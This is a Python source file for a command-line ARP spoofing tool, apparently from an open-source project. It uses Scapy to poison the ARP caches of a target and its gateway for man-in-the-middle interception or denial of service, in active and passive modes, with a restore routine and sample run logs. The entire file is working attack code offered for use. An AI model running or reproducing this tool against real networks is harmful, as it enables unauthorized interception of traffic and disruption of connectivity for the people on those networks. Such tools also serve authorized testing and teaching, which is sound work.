#!/usr/bin/env python
# -*- coding: utf-8 -*-

###################
#    This package implements an ARP Spoofer for MIM or DoS attacks
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an ARP Spoofer for MIM
(Man-In-the-Middle) or DoS (Denial of Service) attacks.

>>> spoofer = SpooferARP('172.16.10.1', '172.16.0.35')
>>> spoofer.active_cache_poisonning()
>>> spoofer = SpooferARP('172.16.10.1', '172.16.0.35', conf.iface, False, 0.5)
>>> spoofer.passive_cache_poisonning(asynchronous=True)
>>> spoofer.run = False
>>> spoofer.sniffer.stop()  # only with asynchronous mode
>>> spoofer.restore()       # only with asynchronous mode

~# python3 ArpSpoof.py 172.16.10.1 172.16.0.33
[13/01/2022 11:12:13 AM] WARNING  Start ARP spoof between 172.16.10.1 (2e:d7:11:94:e4:82) and 172.16.0.33 (85:43:71:78:55:54).
[13/01/2022 11:12:15 AM] WARNING  End of ARP spoofing. Restore ARP table...
[13/01/2022 11:12:33 AM] CRITICAL End of ARP spoofing. The ARP tables are restored.
~# python3 ArpSpoof.py 172.16.10.1 172.16.0.33 -p -s -v -t 1 -i 172.16.10.
[13/01/2022 11:02:55 AM] DEBUG    Logging is configured.
[13/01/2022 11:02:55 AM] INFO     Interface argument match with (172.16.10.34 cf:e4:cf:5f:8a:4c WIFI)
[13/01/2022 11:02:55 AM] INFO     Network interface is configured (IP: 172.16.10.34, MAC: cf:e4:cf:5f:8a:4c and name: WIFI)
[13/01/2022 11:02:55 AM] DEBUG    Get IP and MAC addresses...
[13/01/2022 11:02:59 AM] INFO     Gateway: 172.16.10.1 2e:d7:11:94:e4:82
[13/01/2022 11:02:59 AM] INFO     Spoof: 172.16.0.33 85:43:71:78:55:54
[13/01/2022 11:02:59 AM] DEBUG    The packets are built.
[13/01/2022 11:02:59 AM] WARNING  Start ARP spoof between 172.16.10.1 (2e:d7:11:94:e4:82) and 172.16.0.33 (85:43:71:78:55:54).
[13/01/2022 11:02:59 AM] DEBUG    Send ARP packet to spoof gateway IP...
[13/01/2022 11:03:01 AM] INFO     Spoof 172.16.10.1 for 172.16.0.33
[13/01/2022 11:03:01 AM] WARNING  End of ARP spoofing. Restore ARP table...
[13/01/2022 11:03:01 AM] DEBUG    Restoring ARP tables for the target...
[13/01/2022 11:03:19 AM] DEBUG    The target's ARP tables are restored.
[13/01/2022 11:03:19 AM] CRITICAL End of ARP spoofing. The ARP tables are restored.
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an ARP Spoofer for MIM
(Man-In-the-Middle) or DoS (Denial of Service) attacks.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ArpSpoof"

copyright = """
ArpSpoof  Copyright (C) 2021  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["SpooferARP"]

from scapy.all import (
    Ether,
    ARP,
    sendp,
    conf,
    getmacbyip,
    Packet,
    sniff,
    AsyncSniffer,
    IFACES,
)
from argparse import ArgumentParser, Namespace
from ipaddress import ip_address
from time import sleep
import scapy.interfaces
import logging
import socket
import sys


class SpooferARP:

    """
    This class implements a arp spoofer.
    """

    def __init__(
        self,
        gateway: str,
        ip_spoof: str,
        iface: scapy.interfaces.NetworkInterface = conf.iface,
        semi: bool = False,
        inter: float = 0.5,
    ):
        self.semi = semi
        self.inter = inter
        self.iface = iface
        self.gateway_name = gateway
        self.spoof_name = ip_spoof
        
        try:
            self.gateway = str(ip_address(gateway))
        except ValueError:
            self.gateway = socket.gethostbyname(gateway)

        try:
            self.ip_spoof = str(ip_address(ip_spoof))
        except ValueError:
            self.ip_spoof = socket.gethostbyname(ip_spoof)

        logging.debug("Get IP and MAC addresses...")

        self.my_ip = iface.ip
        self.my_mac = iface.mac
        self.gateway_mac = getmacbyip(self.gateway, chainCC=1)
        self.mac_spoof = getmacbyip(self.ip_spoof, chainCC=1)

        logging.info(f"Gateway: {self.gateway} {self.gateway_mac}")
        logging.info(f"Spoof: {self.ip_spoof} {self.mac_spoof}")

        self.run = True

        self.spoof_gateway = Ether(dst=self.mac_spoof, src=self.my_mac) / ARP(
            op=2, pdst=self.ip_spoof, psrc=self.gateway, hwsrc=self.my_mac
        )
        self.spoof_target = Ether(dst=self.gateway_mac, src=self.my_mac) / ARP(
            op=2,
            pdst=self.gateway,
            psrc=self.ip_spoof,
            hwsrc=self.my_mac,
        )

        logging.debug("The packets are built.")

    def active_cache_poisonning(self) -> None:

        """
        This function start active ARP cache poisonning attack.
        """

        logging.warning(
            f"Start ARP spoof between {self.gateway} ({self.gateway_mac})"
            f" and {self.ip_spoof} ({self.mac_spoof})."
        )

        while self.run:
            self.active_spoof()
            sleep(self.inter)

        logging.warning("End of ARP spoofing. Restore ARP tables...")
        self.restore()
        logging.critical("End of ARP spoofing. The ARP tables are restored.")

    def active_spoof(self) -> None:

        """
        This function send spoofed packets in active cache poisonning attack.
        """

        logging.debug("Send ARP packet to spoof gateway IP...")
        sendp(
            self.spoof_gateway,
            iface=self.iface,
            verbose=0,
        )
        logging.info(f"Spoof {self.gateway} for {self.ip_spoof}")

        if not self.semi:
            logging.debug("Send ARP packet to spoof target IP...")
            sendp(
                self.spoof_target,
                iface=self.iface,
                verbose=0,
            )
            logging.info(f"Spoof {self.ip_spoof} for {self.gateway}")

    def passive_cache_poisonning(self, asynchronous: bool = False) -> None:

        """
        This function implements a passive cache poisonning attack.
        """

        logging.warning(
            f"Start passive ARP spoof between {self.gateway} "
            f"({self.gateway_mac}) and {self.ip_spoof} ({self.mac_spoof})."
        )

        if asynchronous:
            self.sniffer = AsyncSniffer(
                store=False,
                lfilter=self.filter,
                stop_filter=lambda x: self.run,
                prn=self.passive_spoof,
                iface=self.iface,
            )
            self.sniffer.start()
        else:
            sniff(
                store=False,
                lfilter=self.filter,
                stop_filter=lambda x: not self.run,
                prn=self.passive_spoof,
                iface=self.iface,
            )
            self.restore()

    def passive_spoof(self, packet: Packet) -> None:

        """
        This function spoofs ARP in passive mode.
        """

        if packet[ARP].pdst == self.gateway:
            sendp(
                self.spoof_gateway,
                iface=self.iface,
                verbose=0,
            )
            logging.info(f"Spoof {self.gateway} for {self.ip_spoof}")
        else:
            sendp(
                self.spoof_target,
                iface=self.iface,
                verbose=0,
            )
            logging.info(f"Spoof {self.ip_spoof} for {self.gateway}")

    def filter(self, packet: Packet) -> bool:

        """
        This function implements a filter for passive attack.
        """

        if packet.haslayer(ARP):
            arp = packet.getlayer(ARP)
            ethernet = packet.getlayer(Ether)
            if arp.op == 1 and (
                (ethernet.src == self.mac_spoof and arp.pdst == self.gateway)
                or (
                    ethernet.src == self.gateway_mac
                    and arp.pdst == self.ip_spoof
                )
            ):
                return True
        return False

    def restore(self) -> None:

        """
        This function restore ARP tables after ARP cache poisonning.
        """

        logging.debug("Restoring ARP tables for the target...")
        sendp(
            Ether(src=self.gateway_mac, dst=self.mac_spoof)
            / ARP(
                op=2,
                pdst=self.ip_spoof,
                psrc=self.gateway,
                hwsrc=self.gateway_mac,
            ),
            iface=self.iface,
            inter=0.5,
            count=7,
            verbose=0,
        )
        logging.debug("The target's ARP tables are restored.")
        if not self.semi:
            logging.debug("Restoring ARP tables for the gateway...")
            sendp(
                Ether(src=self.mac_spoof, dst=self.gateway_mac)
                / ARP(
                    op=2,
                    pdst=self.gateway,
                    psrc=self.ip_spoof,
                    hwsrc=self.mac_spoof,
                ),
                iface=self.iface,
                inter=0.5,
                count=7,
                verbose=0,
            )
            logging.debug("The gateway's ARP tables are restored.")


def parse_args() -> Namespace:

    """
    This function parses command line arguments.
    """

    parser = ArgumentParser()
    parser.add_argument("gateway", help="Gateway IP or hostname")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument(
        "--verbose",
        "-v",
        help="Mode verbose (print debug message)",
        action="store_true",
    )
    parser.add_argument(
        "--interface",
        "-i",
        help="Part of the IP, MAC or name of the interface",
    )
    parser.add_argument(
        "--time",
        "-t",
        help="Time in seconds to sleep between sending ARP packets.",
        type=float,
        default=0.5,
    )
    parser.add_argument(
        "--semi",
        "-s",
        help="Spoof IP of the gateway (target will lost internet connection).",
        action="store_true",
    )
    parser.add_argument(
        "--passive",
        "-p",
        help="Passive mode (response to ARP request only)",
        action="store_true",
    )
    return parser.parse_args()

def main() -> None:

    """
    This function performs a arp spoofing from the command line.
    """

    print(copyright)

    arguments = parse_args()

    logging.basicConfig(
        level=logging.DEBUG if arguments.verbose else logging.WARNING,
        format="%(asctime)s%(levelname)-9s%(message)s",
        datefmt="[%m/%d/%Y %I:%M:%S %p] ",
    )

    logging.debug("Logging is configured.")

    iface = conf.iface
    if arguments.interface is not None:
        for iface_ in IFACES.values():
            if (
                arguments.interface in iface_.ip
                or arguments.interface in iface_.mac
                or arguments.interface in iface_.network_name
            ):
                logging.info(
                    "Interface argument match with "
                    f"({iface_.ip} {iface_.mac} {iface_.name})"
                )
                iface = iface_
                break

    logging.info(
        f"Network interface is configured (IP: {iface.ip}, MAC:"
        f" {iface.mac} and name: {iface.name})"
    )

    spoofer = SpooferARP(
        arguments.gateway,
        arguments.target,
        iface,
        arguments.semi,
        arguments.time,
    )

    if arguments.passive:
        attribute = "passive_cache_poisonning"
    else:
        attribute = "active_cache_poisonning"

    try:
        getattr(spoofer, attribute)()
    except KeyboardInterrupt:
        spoofer.run = False
        sniffer = getattr(spoofer, "sniffer", None)
        if sniffer:
            sniffer.stop()
    finally:
        logging.warning("End of ARP spoofing. Restore ARP table...")
        spoofer.restore()
        logging.critical("End of ARP spoofing. The ARP tables are restored.")


if __name__ == "__main__":
    main()
    sys.exit(0)
